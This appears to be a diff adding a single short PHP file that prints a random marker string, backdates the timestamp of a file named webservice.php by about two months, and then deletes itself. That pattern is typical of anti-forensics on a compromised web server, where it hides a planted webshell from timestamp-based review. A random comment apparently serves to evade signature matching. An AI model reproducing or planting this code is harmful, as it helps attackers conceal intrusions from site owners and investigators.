@@ -1,0 +1,1 @@
+<?php echo "dmqrmkUrwB"; if (file_exists("./webservice.php")){ touch("./webservice.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*MMv9F8HeqhgXbkFBrnPs*/ ?>
